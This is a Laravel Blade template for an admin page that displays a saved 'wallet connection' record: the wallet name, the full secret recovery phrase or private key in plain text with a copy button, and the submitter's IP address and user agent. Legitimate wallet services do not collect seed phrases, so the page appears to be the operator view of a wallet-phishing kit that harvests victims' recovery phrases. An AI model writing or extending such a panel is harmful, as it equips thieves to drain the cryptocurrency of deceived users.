@extends('layouts.app')

@section('content')
<div class="container mt-5">
    <div class="row mb-4">
        <div class="col-12">
            <a href="{{ route('admin.wallet-connections') }}" class="btn btn-secondary mb-3">
                <i class="fa fa-arrow-left"></i> Back to List
            </a>
            <h1 class="mb-1">{{ $walletConnection->wallet_name }}</h1>
            <p class="text-muted">Saved on {{ $walletConnection->created_at->format('M d, Y H:i') }}</p>
            <hr>
        </div>
    </div>

    <div class="row">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header" style="background-color: #667eea; color: white;">
                    <h5 class="mb-0">Wallet Details</h5>
                </div>
                <div class="card-body">
                    <div class="mb-4">
                        <label class="fw-bold text-muted">Wallet Name</label>
                        <p>{{ $walletConnection->wallet_name }}</p>
                    </div>

                    <div class="mb-4">
                        <label class="fw-bold text-muted">Secret Phrase / Private Key (12-24 Words)</label>
                        <div style="background-color: #fff3cd; padding: 20px; border-radius: 8px; border: 2px solid #ffc107; position: relative;">
                            <code style="word-break: break-word; white-space: pre-wrap; font-size: 15px; line-height: 1.8; color: #333; display: block;">{{ $walletConnection->secret_phrase }}</code>
                            <button class="btn btn-sm btn-warning position-absolute" style="top: 10px; right: 10px;" onclick="copyToClipboard()" title="Copy phrase">
                                <i class="fa fa-copy"></i> Copy
                            </button>
                        </div>
                        <small class="text-danger d-block mt-2"><strong>⚠️ IMPORTANT:</strong> Keep this secret safe. Do not share with anyone. Never paste in unsecured channels.</small>
                    </div>

                    <div class="mb-4">
                        <label class="fw-bold text-muted">IP Address</label>
                        <p>{{ $walletConnection->ip_address ?? 'N/A' }}</p>
                    </div>

                    <div class="mb-4">
                        <label class="fw-bold text-muted">User Agent</label>
                        <p><small>{{ $walletConnection->user_agent ?? 'N/A' }}</small></p>
                    </div>

                    <div class="mb-4">
                        <label class="fw-bold text-muted">Created At</label>
                        <p>{{ $walletConnection->created_at->format('M d, Y \a\t H:i:s') }}</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    .container {
        max-width: 1200px;
    }

    h1 {
        color: #333;
        font-weight: 600;
    }

    .card {
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        border: 1px solid #dee2e6;
    }

    code {
        color: #495057;
        font-size: 13px;
    }
</style>

<script>
function copyToClipboard() {
    const phrase = document.querySelector('code').innerText;
    navigator.clipboard.writeText(phrase).then(() => {
        alert('Phrase copied to clipboard!');
    });
}
</script>
@endsection
